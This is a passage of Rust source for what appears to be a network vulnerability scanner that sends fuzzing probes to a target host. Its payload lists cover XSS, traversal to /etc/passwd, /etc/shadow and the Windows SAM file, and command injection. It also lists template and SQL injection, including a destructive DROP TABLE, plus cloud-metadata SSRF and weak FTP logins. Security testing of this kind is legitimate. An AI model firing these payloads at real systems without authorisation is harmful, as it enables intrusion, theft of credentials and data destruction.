            let es_or_couch = if port == 9200 { "Elasticsearch" } else { "CouchDB" };
            logs.push(format!("[FUZZ][{}] Detected service", es_or_couch));
            let http_logs = fuzz_es_couch_vulnerabilities(target, port).await?;
            logs.extend(http_logs);
        }

        995 => {
            logs.push("[FUZZ][POP3S] Detected POP3S service".into());
            let pop3s_logs = fuzz_pop3s_vulnerabilities(target, port).await?;
            logs.extend(pop3s_logs);
        }

        143 | 993 => {
            if port == 143 {
                logs.push("[FUZZ][IMAP] Detected IMAP service".into());
            } else {
                logs.push("[FUZZ][IMAPS] Detected IMAPS service".into());
            }
            let imap_logs = fuzz_imap_vulnerabilities(target, port).await?;
            logs.extend(imap_logs);
        }

        25 | 587 | 465 => {
            let service_name = match port {
                25 => "[FUZZ][SMTP]",
                587 => "[FUZZ][SMTP-TLS]",
                465 => "[FUZZ][SMTPS]",
                _ => "[FUZZ][SMTP]",
            };
            logs.push(format!("{} Detected SMTP service on port {}", service_name, port));
            let smtp_logs = fuzz_smtp_vulnerabilities(target, port).await?;
            logs.extend(smtp_logs);
        }

        119 => {
            logs.push("[FUZZ][NNTP] Detected NNTP service".into());
            let nntp_logs = fuzz_nntp_vulnerabilities(target, port).await?;
            logs.extend(nntp_logs);
        }

        563 => {
            logs.push("[FUZZ][NNTPS] Detected NNTPS service".into());
            let nntps_logs = fuzz_nntps_vulnerabilities(target, port).await?;
            logs.extend(nntps_logs);
        }

        27036 => {
            logs.push("[FUZZ][STEAM] Detected Steam service".into());
            let steam_logs = fuzz_steam_vulnerabilities(target, port).await?;
            logs.extend(steam_logs);
        }

        49664 | 49665 | 49668 | 49669 | 49672 | 49751 => {
            logs.push(format!("[FUZZ][DYNAMIC-RPC] Detected Dynamic RPC service on port {}", port));
            let drpc_logs = fuzz_dynamic_rpc_vulnerabilities(target, port).await?;
            logs.extend(drpc_logs);
        }

        3389 => {
            logs.push("[FUZZ][RDP] Detected RDP service".into());
            let rdp_logs = fuzz_rdp_vulnerabilities(target, port).await?;
            logs.extend(rdp_logs);
        }

        5900 => {
            logs.push("[FUZZ][VNC] Detected VNC service".into());
            let vnc_logs = fuzz_vnc_vulnerabilities(target, port).await?;
            logs.extend(vnc_logs);
        }

        8443 => {
            logs.push("[FUZZ][TLS] Detected TLS/SSL service".into());
            let tls_cve_logs = detect_tls_version_cves(target, port).await?;
            logs.extend(tls_cve_logs);

            let proxy_logs = fuzz_proxy_app_servers(target, port).await?;
            logs.extend(proxy_logs);
        }

        161 | 162 => {
            logs.push("[FUZZ][SNMP] Detected SNMP service".into());
            let snmp_logs = fuzz_snmp_vulnerabilities(target, port).await?;
            logs.extend(snmp_logs);
        }

        69 => {
            logs.push("[FUZZ][TFTP] Detected TFTP service".into());
            let tftp_logs = fuzz_tftp_vulnerabilities(target, port).await?;
            logs.extend(tftp_logs);
        }

        514 => {
            logs.push("[FUZZ][SYSLOG] Detected Syslog service".into());
            let syslog_logs = fuzz_syslog_vulnerabilities(target, port).await?;
            logs.extend(syslog_logs);
        }

        623 => {
            logs.push("[FUZZ][IPMI] Detected IPMI service".into());
            let ipmi_logs = fuzz_ipmi_vulnerabilities(target, port).await?;
            logs.extend(ipmi_logs);
        }

        1900 => {
            logs.push("[FUZZ][SSDP] Detected SSDP/UPnP service".into());
            let ssdp_logs = fuzz_ssdp_vulnerabilities(target, port).await?;
            logs.extend(ssdp_logs);
        }

        5000 | 5001 => {
            logs.push("[FUZZ][DOCKER-REGISTRY] Detected Docker Registry v2 candidate".into());
            let reg_logs = fuzz_docker_registry_vulnerabilities(target, port).await?;
            logs.extend(reg_logs);
        }

        2375 | 2376 => {
            logs.push("[FUZZ][DOCKER-DAEMON] Detected Docker Remote API/daemon".into());
            let docker_logs = fuzz_docker_daemon_vulnerabilities(target, port).await?;
            logs.extend(docker_logs);
        }

        4505 | 4506 => {
            logs.push("[FUZZ][SALTSTACK] Detected Salt master ports".into());
            let salt_logs = fuzz_saltstack_vulnerabilities(target, port).await?;
            logs.extend(salt_logs);
        }

        8081 | 4873 => {
            logs.push("[FUZZ][REGISTRY] Detected NPM/Artifactory registry candidate".into());
            let reg_logs = fuzz_registry_vulnerabilities(target, port).await?;
            logs.extend(reg_logs);
        }

        79 => {
            logs.push("[FUZZ][FINGER] Detected Finger service".into());
            let finger_logs = fuzz_finger_vulnerabilities(target, port).await?;
            logs.extend(finger_logs);
        }

        _ => {
            logs.push(format!("[FUZZ] No fuzz modules for port {}", port));
        }
    }

    logs.push("[FUZZ] Completed fuzzing".into());
    Ok(logs)
}

/// Checks if target port responds to HTTP HEAD request.
async fn is_http_service(target: &str, port: u16) -> anyhow::Result<bool> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);

    let mut stream = TcpStream::connect(addr).await?;
    let req = format!(
        "HEAD / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        target
    );

    stream.write_all(req.as_bytes()).await?;

    let mut buf = [0u8; 32];
    let n = stream.read(&mut buf).await?;
    let resp = String::from_utf8_lossy(&buf[..n]);

    Ok(resp.starts_with("HTTP/"))
}

/// Sends HTTP HEAD request and returns full response string.
async fn http_head_probe(ip: std::net::IpAddr, port: u16, host: &str) -> anyhow::Result<String> {
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;
    let req = format!(
        "HEAD / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        host
    );
    stream.write_all(req.as_bytes()).await?;
    let mut response = Vec::new();
    stream.read_to_end(&mut response).await?;
    Ok(String::from_utf8_lossy(&response).to_string())
}

/// Sends OPTIONS request to discover allowed HTTP methods.
async fn discover_http_methods(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;

    let req = format!(
        "OPTIONS / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        target
    );

    stream.write_all(req.as_bytes()).await?;

    let mut response = Vec::new();
    stream.read_to_end(&mut response).await?;
    let text = String::from_utf8_lossy(&response);

    for line in text.lines() {
        if line.to_lowercase().starts_with("allow:") {
            let methods = line
                .split(':')
                .nth(1)
                .unwrap_or("")
                .split(',')
                .map(|m| m.trim().to_string())
                .collect();
            return Ok(methods);
        }
    }

    Ok(vec!["GET".into()])
}

/// Tests each discovered HTTP method (excluding GET/HEAD) for unusual responses.
async fn fuzz_http_methods_auto(
    target: &str,
    port: u16,
    methods: &[String],
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut findings = Vec::new();

    for method in methods {
        if method == "GET" || method == "HEAD" {
            continue;
        }

        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;

        let req = format!(
            "{} /test.txt HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\n\r\ntest",
            method, target
        );

        stream.write_all(req.as_bytes()).await?;
        let mut resp = Vec::new();
        stream.read_to_end(&mut resp).await?;
        let text = String::from_utf8_lossy(&resp);

        if !text.starts_with("HTTP/1.1 405") {
            findings.push(format!(
                "{} allowed -> {}",
                method,
                text.lines().next().unwrap_or("unknown")
            ));
        }
    }

    Ok(findings)
}

/// Returns list of user-agent strings to test for filtering/WAF detection.
fn user_agent_list() -> Vec<&'static str> {
    vec![
        "Mozilla/5.0",
        "curl/7.88.1",
        "sqlmap/1.7",
        "nikto",
        "masscan",
        "python-requests/2.28",
        "Go-http-client/1.1",
    ]
}

/// Tests HTTP service with various user-agent strings to detect filtering/WAF.
async fn fuzz_user_agent(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut results = Vec::new();
    let mut first_status = String::new();

    for ua in user_agent_list() {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;

        let req = format!(
            "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: close\r\n\r\n",
            target, ua
        );

        stream.write_all(req.as_bytes()).await?;
        let mut resp = Vec::new();
        stream.read_to_end(&mut resp).await?;
        let text = String::from_utf8_lossy(&resp);

        let status = text.lines().next().unwrap_or("unknown").to_string();

        if first_status.is_empty() {
            first_status = status.clone();
        }

        if status != first_status {
            results.push(format!("[FUZZ-UA] FILTERED: UA '{}' returned {} (others return {})", ua, status, first_status));
        }
    }

    if results.is_empty() {
        results.push(format!("[FUZZ-UA] All user-agents returned: {}", first_status));
    }

    Ok(results)
}

/// Loads path wordlist from file, ensuring each path starts with /.
fn load_wordlist(path: &str) -> anyhow::Result<Vec<String>> {
    let content = fs::read_to_string(path)?;
    Ok(content
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| if l.starts_with('/') { l.to_string() } else { format!("/{}", l) })
        .collect())
}

/// Fuzzes HTTP paths using wordlist or default set; logs interesting responses.
async fn fuzz_http_paths(
    target: &str,
    port: u16,
    wordlist: Option<&String>,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;

    let mut logs = Vec::new();

    let paths = if let Some(wl) = wordlist {
        match load_wordlist(wl) {
            Ok(p) => {
                logs.push(format!("[FUZZ-PATH] Loaded {} paths from wordlist", p.len()));
                p
            }
            Err(e) => {
                logs.push(format!("[FUZZ-PATH] Failed to load wordlist: {}", e));
                return Ok(logs);
            }
        }
    } else {
        logs.push("[FUZZ-PATH] Using default paths".into());
        vec![
            "/admin".into(),
            "/login".into(),
            "/backup".into(),
            "/.git/HEAD".into(),
            "/config.php".into(),
            "/phpinfo.php".into(),
            "/wp-login.php".into(),
            "/server-status".into(),
            "/.env".into(),
            "/robots.txt".into(),
            "/.well-known/security.txt".into(),
            "/../../../../etc/passwd".into(),
            "/..%2f..%2f..%2fetc/passwd".into(),
            "/..%2F..%2F..%2Fetc/passwd".into(),
            "/..%252f..%252f..%252fetc/passwd".into(),
        ]
    };

    let mut paths_to_test: Vec<String> = paths.into_iter().rev().collect();
    let mut failures = 0;

    while let Some(path) = paths_to_test.pop() {
        let addr = SocketAddr::new(ip, port);
        
        let result = async {
            let mut stream = TcpStream::connect(addr).await?;
            let req = format!(
                "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                path, target
            );
            stream.write_all(req.as_bytes()).await?;
            let mut resp = Vec::new();
            stream.read_to_end(&mut resp).await?;
            Ok::<Vec<u8>, std::io::Error>(resp)
        }.await;

        match result {
            Ok(resp) => {
                let text = String::from_utf8_lossy(&resp);
                let status = text.lines().next().unwrap_or("No response");

                if !status.contains("404") && !status.contains("405") {
                    logs.push(format!("[FUZZ-PATH] {} -> {}", path, status));
                }

                if status.contains("200") || status.contains("403") || status.contains("301") || status.contains("302") {
                    if path == "/admin" {
                        paths_to_test.push("/admin/login".into());
                        paths_to_test.push("/admin/config".into());
                    }

                    let extensions = [".bak", ".old", "~"];
                    for ext in &extensions {
                        let new_path = format!("{}{}", path, ext);
                        if !paths_to_test.contains(&new_path) {
                            paths_to_test.push(new_path);
                        }
                    }

                    failures = 0;
                } else if status.contains("404") || status.contains("405") {
                    failures = 0;
                } else {
                    failures += 1;
                }
            }
            Err(e) => {
                logs.push(format!("[FUZZ-PATH] {} -> Connection error: {}", path, e));
                failures += 1;
            }
        }

        if failures >= 10 {
            logs.push("[FUZZ] Too many failures, stopping path fuzzing".into());
            break;
        }
    }

    Ok(logs)
}

/// Tests FTP service for anonymous login and weak credentials.
async fn fuzz_ftp_auth(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;

    let mut buf = [0u8; 256];
    stream.read(&mut buf).await?;

    let creds = vec![
        ("anonymous", "anonymous"),
        ("ftp", "ftp"),
        ("admin", "admin"),
    ];

    let mut logs = Vec::new();

    for (user, pass) in creds {
        let cmd = format!("USER {}\r\nPASS {}\r\n", user, pass);
        stream.write_all(cmd.as_bytes()).await?;
        let n = stream.read(&mut buf).await?;
        let resp = String::from_utf8_lossy(&buf[..n]);

        if resp.contains("230") {
            logs.push(format!("[FUZZ-FTP] Login success {}:{}", user, pass));
        }
        if resp.contains("530") {
            logs.push(format!("[FUZZ-FTP] Login rejected {}:{}", user, pass));
        }
    }

    Ok(logs)
}

/// Returns XSS test payloads (script tags, event handlers, etc.).
fn xss_payloads() -> Vec<&'static str> {
    vec![
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(document.domain)</script>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=javascript:alert(1)>",
        "<IMG SRC=JaVaScRiPt:alert(1)>",
    ]
}

/// Tests HTTP parameters for XSS by injecting payloads and detecting reflection.
async fn fuzz_http_xss(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-XSS] Starting XSS detection".into());
    
    let test_params = vec!["q", "search", "query", "name", "id", "page", "url", "data", "input"];
    let payloads = xss_payloads();
    
    let mut vulnerabilities_found = 0;
    
    for param in &test_params {
        for payload in &payloads {
            let encoded_payload = urlencoding::encode(payload);
            let test_path = format!("/?{}={}", param, encoded_payload);
            
            let addr = SocketAddr::new(ip, port);
            let result = async {
                let mut stream = TcpStream::connect(addr).await?;
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                    test_path, target
                );
                stream.write_all(req.as_bytes()).await?;
                let mut resp = Vec::new();
                stream.read_to_end(&mut resp).await?;
                Ok::<Vec<u8>, std::io::Error>(resp)
            }.await;
            
            match result {
                Ok(resp) => {
                    let text = String::from_utf8_lossy(&resp);
                    
                    if text.contains(payload) {
                        let context = detect_xss_context(&text, payload);
                        
                        if !context.is_empty() {
                            vulnerabilities_found += 1;
                            logs.push(format!(
                                "[FUZZ-XSS]  VULNERABLE: Parameter '{}' reflects payload in {} context",
                                param, context
                            ));
                            logs.push(format!(
                                "[FUZZ-XSS]   Payload: {}",
                                payload
                            ));
                            logs.push(format!(
                                "[FUZZ-XSS]   Test URL: http://{}:{}{}",
                                target, port, test_path
                            ));
                            
                            break;
                        }
                    }
                }
                Err(e) => {
                    logs.push(format!("[FUZZ-XSS] Connection error for param '{}': {}", param, e));
                    break;
                }
            }
        }
    }
    
    if vulnerabilities_found == 0 {
        logs.push("[FUZZ-XSS]  No XSS vulnerabilities detected".into());
    } else {
        logs.push(format!("[FUZZ-XSS] Found {} potential XSS vulnerabilities", vulnerabilities_found));
    }
    
    Ok(logs)
}

/// Analyzes HTML context where XSS payload was reflected (script/attribute/text/comment).
fn detect_xss_context(response: &str, payload: &str) -> String {
    let payload_lower = payload.to_lowercase();
    let response_lower = response.to_lowercase();
    
    if let Some(pos) = response_lower.find(&payload_lower) {
        let start = if pos > 50 { pos - 50 } else { 0 };
        let end = std::cmp::min(pos + payload.len() + 50, response.len());
        let context_snippet = &response[start..end];
        
        if context_snippet.contains("<script") || payload.contains("<script") {
            return "HTML/Script".to_string();
        }
        if context_snippet.contains("onerror=") || context_snippet.contains("onload=") {
            return "HTML Event Handler".to_string();
        }
        if context_snippet.contains("<img") || context_snippet.contains("<svg") {
            return "HTML Tag".to_string();
        }
        if context_snippet.contains("href=\"javascript:") {
            return "JavaScript Protocol".to_string();
        }
        if context_snippet.contains("<iframe") {
            return "IFrame".to_string();
        }
        
        return "HTML Body".to_string();
    }
    
    String::new()
}

/// Returns LFI test payloads (path traversal) with expected file signatures.
fn lfi_payloads() -> Vec<(&'static str, &'static str)> {
    vec![
        ("../../../etc/passwd", "root:"),
        ("../../etc/passwd", "root:"),
        ("../etc/passwd", "root:"),
        ("../../../../etc/passwd", "root:"),
        ("../../../../../etc/passwd", "root:"),
        ("..\\..\\..\\..\\..\\windows\\win.ini", "[windows]"),
        ("..\\..\\..\\windows\\system32\\config\\sam", "SAM"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
        ("../../../etc/passwd%00", "root:"),
        ("../../../etc/passwd%20", "root:"),
        ("../../../etc/passwd%23", "root:"),
        ("../../../etc/hosts", "localhost"),
        ("../../../etc/issue", ""),
        ("/etc/passwd", "root:"),
        ("/etc/shadow", "root:"),
        ("/etc/hosts", "localhost"),
        ("/proc/self/environ", "PATH="),
        ("/proc/self/cwd", ""),
        ("../../../windows/win.ini", "[windows]"),
        ("../../../windows/system32/drivers/etc/hosts", "localhost"),
        ("../../../boot.ini", "[boot loader]"),
        ("../../../config.php", ""),
        ("../../../web.config", ""),
        ("/var/www/html/config.php", ""),
        ("file:///etc/passwd", "root:"),
        ("phar://", ""),
    ]
}

/// Tests HTTP parameters for LFI by injecting path traversal payloads.
async fn fuzz_http_lfi(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-LFI] Starting Local File Inclusion detection".into());
    
    let test_params = vec!["file", "path", "page", "include", "load", "view", "url", "doc", "pdf"];
    let payloads = lfi_payloads();
    
    let mut vulnerabilities_found = 0;
    
    for param in &test_params {
        for (payload, signature) in &payloads {
            let encoded_payload = urlencoding::encode(payload);
            let test_path = format!("/?{}={}", param, encoded_payload);
            
            let addr = SocketAddr::new(ip, port);
            let result = async {
                let mut stream = TcpStream::connect(addr).await?;
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                    test_path, target
                );
                stream.write_all(req.as_bytes()).await?;
                let mut resp = Vec::new();
                stream.read_to_end(&mut resp).await?;
                Ok::<Vec<u8>, std::io::Error>(resp)
            }.await;
            
            match result {
                Ok(resp) => {
                    let text = String::from_utf8_lossy(&resp);
                    
                    let is_vulnerable = detect_lfi_vulnerability(&text, payload, signature);
                    
                    if is_vulnerable {
                        vulnerabilities_found += 1;
                        logs.push(format!(
                            "[FUZZ-LFI]  VULNERABLE: Parameter '{}' may allow file inclusion",
                            param
                        ));
                        logs.push(format!(
                            "[FUZZ-LFI]   Payload: {}",
                            payload
                        ));
                        logs.push(format!(
                            "[FUZZ-LFI]   Test URL: http://{}:{}{}", 
                            target, port, test_path
                        ));
                        
                        if let Some(snippet) = extract_file_snippet(&text, payload) {
                            logs.push(format!(
                                "[FUZZ-LFI]   File content (snippet): {}",
                                snippet
                            ));
                        }
                        
                        break;
                    }
                }
                Err(e) => {
                    logs.push(format!("[FUZZ-LFI] Connection error for param '{}': {}", param, e));
                    break;
                }
            }
        }
    }
    
    if vulnerabilities_found == 0 {
        logs.push("[FUZZ-LFI]  No LFI vulnerabilities detected".into());
    } else {
        logs.push(format!("[FUZZ-LFI] Found {} potential LFI vulnerabilities", vulnerabilities_found));
    }
    
    Ok(logs)
}

/// Returns RCE test payloads (command injection, template injection, SQL->xp_cmdshell).
fn rce_payloads() -> Vec<(&'static str, &'static str)> {
    vec![
        ("; id", "uid="),
        ("| id", "uid="),
        ("& id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; whoami", "root"),
        ("| whoami", "root"),
        ("; echo test", "test"),
        ("| echo test", "test"),
        ("& echo test", "test"),
        
        ("; sleep 5", ""),
        ("| sleep 5", ""),
        
        ("& whoami", "\\"),
        ("; dir", "Directory"),
        ("| dir", "Directory"),
        ("& dir", "Directory"),
        
        ("../../bin/id", "uid="),
        ("..\\..\\windows\\system32\\whoami", "\\"),
        
        ("{{7*7}}", "49"),
        ("<%= 7*7 %>", "49"),
        ("${7*7}", "49"),
        
        ("'; DROP TABLE users; --", "DROP"),
        ("1' UNION SELECT @@version; --", "version"),
    ]
}

/// Tests HTTP parameters for RCE by injecting OS command payloads and checking for execution indicators.
async fn fuzz_http_rce(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-RCE] Starting Remote Code Execution detection".into());
    
    let test_params = vec!["cmd", "command", "exec", "execute", "system", "shell", "bash", "code", "query"];
    let payloads = rce_payloads();
    
    let mut vulnerabilities_found = 0;
    
    for param in &test_params {
        for (payload, indicator) in &payloads {
            let encoded_payload = urlencoding::encode(payload);
            let test_path = format!("/?{}={}", param, encoded_payload);
            
            let addr = SocketAddr::new(ip, port);
            let result = async {
                let mut stream = TcpStream::connect(addr).await?;
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                    test_path, target
                );
                stream.write_all(req.as_bytes()).await?;
                let mut resp = Vec::new();
                stream.read_to_end(&mut resp).await?;
                Ok::<Vec<u8>, std::io::Error>(resp)
            }.await;
            
            match result {
                Ok(resp) => {
                    let text = String::from_utf8_lossy(&resp);
                    
                    if !indicator.is_empty() && text.contains(indicator) {
                        vulnerabilities_found += 1;
                        logs.push(format!(
                            "[FUZZ-RCE]  CRITICAL: Parameter '{}' may allow RCE",
                            param
                        ));
                        logs.push(format!(
                            "[FUZZ-RCE]   Payload: {}",
                            payload
                        ));
                        logs.push(format!(
                            "[FUZZ-RCE]   Indicator found: {}",
                            indicator
                        ));
                        logs.push(format!(
                            "[FUZZ-RCE]   Test URL: http://{}:{}{}",
                            target, port, test_path
                        ));
                        
                        if let Some(start) = text.find(indicator) {
                            let end = std::cmp::min(start + 100, text.len());
                            let snippet = &text[start..end];
                            logs.push(format!(
                                "[FUZZ-RCE]   Response snippet: {}",
                                snippet.replace('\n', " | ")
                            ));
                        }
                        
                        break;
                    }
                    
                    if payload.contains("{{") && text.contains("49") {
                        vulnerabilities_found += 1;
                        logs.push(format!(
                            "[FUZZ-RCE]  CRITICAL: Parameter '{}' vulnerable to Template Injection (RCE)",
                            param
                        ));
                        logs.push(format!("[FUZZ-RCE]   Payload: {}", payload));
                        logs.push(format!("[FUZZ-RCE]   Test URL: http://{}:{}{}",
                            target, port, test_path
                        ));
                        break;
                    }
                }
                Err(e) => {
                    logs.push(format!("[FUZZ-RCE] Connection error for param '{}': {}", param, e));
                    break;
                }
            }
        }
    }
    
    if vulnerabilities_found == 0 {
        logs.push("[FUZZ-RCE]  No RCE vulnerabilities detected".into());
    } else {
        logs.push(format!("[FUZZ-RCE] Found {} potential RCE vulnerabilities", vulnerabilities_found));
    }
    
    Ok(logs)
}

/// Tests HTTP parameters for SSRF by injecting internal/cloud metadata URLs and checking responses.
async fn fuzz_http_ssrf(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SSRF] Starting SSRF detection".into());

    let params = vec!["url", "dest", "redirect", "next", "uri", "path", "target", "callback"];
    let payloads = vec![
        "http://127.0.0.1:80/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/_HELLO",
        "http://localhost:2375/version",
    ];

    for param in &params {
        for payload in &payloads {
            let encoded = urlencoding::encode(payload);
            let path = format!("/?{}={}", param, encoded);

            let addr = SocketAddr::new(ip, port);
            let result = async {
                let mut stream = TcpStream::connect(addr).await?;
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                    path, target
                );
                stream.write_all(req.as_bytes()).await?;
                let mut resp = Vec::new();
                stream.read_to_end(&mut resp).await?;
                Ok::<Vec<u8>, std::io::Error>(resp)
            }.await;

            match result {
                Ok(resp) => {
                    let text = String::from_utf8_lossy(&resp);
                    let status = text.lines().next().unwrap_or("");

                    if text.contains("ami-id") || text.contains("instance-id") || text.contains("root:x:") {
                        logs.push(format!("[FUZZ-SSRF]  Possible SSRF via param '{}' payload '{}': {}", param, payload, status));
                    } else if status.contains("200") || status.contains("30") {
                        logs.push(format!("[FUZZ-SSRF]  SSRF test param '{}' payload '{}' -> {}", param, payload, status));
                    }
                }
                Err(_) => {}
            }
        }
    }

    if logs.len() == 1 {
        logs.push("[FUZZ-SSRF]  No SSRF indicators found".into());
    }

    Ok(logs)
}

/// Tests HTTP parameters for open redirect by injecting external URLs and checking 3xx responses.
async fn fuzz_http_open_redirect(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-REDIRECT] Starting Open Redirect detection".into());

    let params = vec!["next", "redirect", "url", "dest", "continue", "to", "target", "r"];
    let payloads = vec![
        "//evil.com",
        "http://evil.com",
        "https://evil.com",
        "///evil.com",
        "////evil.com",
    ];

    for param in &params {
        for payload in &payloads {
            let encoded = urlencoding::encode(payload);
            let path = format!("/?{}={}", param, encoded);

            let addr = SocketAddr::new(ip, port);
            let result = async {
                let mut stream = TcpStream::connect(addr).await?;
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                    path, target
                );
                stream.write_all(req.as_bytes()).await?;
                let mut resp = Vec::new();
                stream.read_to_end(&mut resp).await?;
                Ok::<Vec<u8>, std::io::Error>(resp)
            }.await;

            if let Ok(resp) = result {
                let text = String::from_utf8_lossy(&resp);
                if let Some(loc) = extract_header(&text, "Location") {
                    if loc.contains("evil.com") {
                        logs.push(format!("[FUZZ-REDIRECT]  Open Redirect via param '{}' payload '{}' -> Location: {}", param, payload, loc));
                    }
                }
            }
        }
    }

    if logs.len() == 1 {
        logs.push("[FUZZ-REDIRECT]  No open redirect indicators found".into());
    }

    Ok(logs)
}

/// Detects open proxies and extracts headers from app servers (Tomcat/Jetty/HAProxy); checks CVEs.
async fn fuzz_proxy_app_servers(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push(format!("[FUZZ-PROXY] Checking proxy/app-server traits on {}:{}", target, port));

    let connect_res = async {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        let req = "CONNECT example.com:80 HTTP/1.1\r\nHost: example.com:80\r\nUser-Agent: clapscan\r\nProxy-Connection: close\r\n\r\n";
        stream.write_all(req.as_bytes()).await?;
        let mut buf = [0u8; 1024];
        let n = tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, Vec<u8>), std::io::Error>((n, buf[..n].to_vec()))
    }
    .await;

    if let Ok((n, resp)) = connect_res {
        if n > 0 {
            let text = String::from_utf8_lossy(&resp);
            let status = text.lines().next().unwrap_or("");
            if status.contains(" 200") {
                logs.push(format!("[FUZZ-PROXY]  Open proxy via CONNECT ({}).", status.trim()));
            } else if status.contains(" 407") {
                logs.push("[FUZZ-PROXY]  Proxy requires authentication (407 Proxy Authentication Required).".into());
            } else if status.starts_with("HTTP/") {
                logs.push(format!("[FUZZ-PROXY] CONNECT rejected: {}", status.trim()));
            } else {
                logs.push("[FUZZ-PROXY] CONNECT sent but non-HTTP response received.".into());
            }
        } else {
            logs.push("[FUZZ-PROXY] No response to CONNECT probe.".into());
        }
    } else {
        logs.push("[FUZZ-PROXY] CONNECT probe failed (socket error).".into());
    }

    let head_res = async {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        let req = format!(
            "HEAD / HTTP/1.1\r\nHost: {}\r\nUser-Agent: clapscan\r\nConnection: close\r\n\r\n",
            target
        );
        stream.write_all(req.as_bytes()).await?;
        let mut resp = Vec::new();
        stream.read_to_end(&mut resp).await?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&resp).to_string())
    }
    .await;

    if let Ok(text) = head_res {
        let status = text.lines().next().unwrap_or("").to_string();
        logs.push(format!("[FUZZ-PROXY] HEAD status: {}", status.trim()));

        if let Some(server) = extract_header(&text, "Server") {
            logs.push(format!("[FUZZ-PROXY] Server: {}", server));
            let version = extract_version_token(&server);
            for hint in proxy_cves_from_server(&server, version.as_deref()) {
                logs.push(hint);
            }
        }
        if let Some(via) = extract_header(&text, "Via") {
            logs.push(format!("[FUZZ-PROXY] Via: {}", via));
        }
        if let Some(xpb) = extract_header(&text, "X-Powered-By") {
            logs.push(format!("[FUZZ-PROXY] X-Powered-By: {}", xpb));
        }
    } else {
        logs.push("[FUZZ-PROXY] HEAD probe failed (no HTTP response).".into());
    }

    Ok(logs)
}

fn extract_version_token(header: &str) -> Option<String> {
    for token in header.split(|c: char| c == ' ' || c == '/' || c == '(' || c == ';') {
        if token.chars().any(|c| c.is_ascii_digit()) {
            return Some(token.trim().to_string());
        }
    }
    None
}

fn proxy_cves_from_server(server: &str, version: Option<&str>) -> Vec<String> {
    let s = server.to_lowercase();
    let mut hints = Vec::new();

    if s.contains("tomcat") || s.contains("coyote") {
        if let Some(ver) = version {
            hints.push(format!("[FUZZ-PROXY][CVE] Apache Tomcat {} detected; check CVE-2020-1938 (Ghostcat/AJP) and CVE-2017-12615 (PUT RCE)", ver));
        } else {
            hints.push("[FUZZ-PROXY][CVE] Apache Tomcat detected; check CVE-2020-1938 (Ghostcat/AJP) and CVE-2017-12615 (PUT RCE)".into());
        }
    }

    if s.contains("jetty") {
        hints.push("[FUZZ-PROXY][CVE] Jetty detected; check CVE-2021-28165/28164 (request smuggling URI normalization).".into());
    }

    if s.contains("haproxy") {
        if let Some(ver) = version {
